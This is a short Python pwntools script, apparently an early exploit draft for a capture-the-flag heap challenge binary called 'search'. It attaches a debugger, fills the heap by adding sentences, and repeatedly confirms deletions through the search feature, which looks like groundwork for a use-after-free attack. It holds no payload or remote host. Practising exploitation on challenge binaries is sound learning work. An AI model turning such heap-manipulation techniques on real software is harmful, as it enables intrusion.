from pwn import *

binary = './search-bf61fbb8fa7212c814b2607a81a84adf'
p = process(binary)
s = '''
b * 0x00400ad0
#b * 0x00400c00
'''

gdb.attach(p, s)
def searchWord(size, word):
	p.sendlineafter(b"Quit\n", b"1")
	p.sendlineafter(b"size:\n", size)
	p.sendlineafter(b"word:\n", word)
def addsentence(size, sentence):
	p.sendlineafter(b"Quit\n", b"2")
	p.sendlineafter(b"size:\n", size)
	p.sendlineafter(b"sentence:\n", sentence)
	
	
addsentence(b"14", b"AAAA BBBB CCCC")
addsentence(b"4", b"AAAA")
addsentence(b"4", b"AAAA")
addsentence(b"4", b"AAAA")
addsentence(b"4", b"AAAA")
addsentence(b"4", b"AAAA")
addsentence(b"4", b"AAAA")

searchWord(b"4", b"AAAA")
p.sendlineafter(b"(y/n)?\n", b"y")
p.sendlineafter(b"(y/n)?\n", b"y")
p.sendlineafter(b"(y/n)?\n", b"y")
p.sendlineafter(b"(y/n)?\n", b"y")
p.sendlineafter(b"(y/n)?\n", b"y")
p.sendlineafter(b"(y/n)?\n", b"y")
p.sendlineafter(b"(y/n)?\n", b"y")

addsentence(b"4", b"BBBB")
addsentence(b"4", b"BBBB")
searchWord(b"4", b"BBBB")
p.sendlineafter(b"(y/n)?\n", b"y")


p.interactive()
